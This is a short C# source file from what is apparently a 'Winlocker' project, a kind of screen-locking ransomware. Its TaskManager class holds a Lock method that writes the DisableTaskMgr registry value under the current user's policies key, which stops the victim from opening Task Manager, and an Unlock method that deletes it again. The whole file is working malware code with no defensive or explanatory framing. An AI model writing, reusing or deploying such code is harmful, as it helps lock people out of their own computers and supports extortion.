using Microsoft.Win32;

namespace Winlocker.Models
{
    public class TaskManager
    {
        public static void Lock()
        {
            RegistryKey reg;
            string key = "1";
            string sub = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";

            reg = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(sub);
            reg.SetValue("DisableTaskMgr", key);
            reg.Close();
        }

        public static void Unlock()
        {
            RegistryKey reg;
            string sub = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";

            reg = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(sub, true);
            reg.DeleteValue("DisableTaskMgr");
            reg.Close();
        }
    }
}
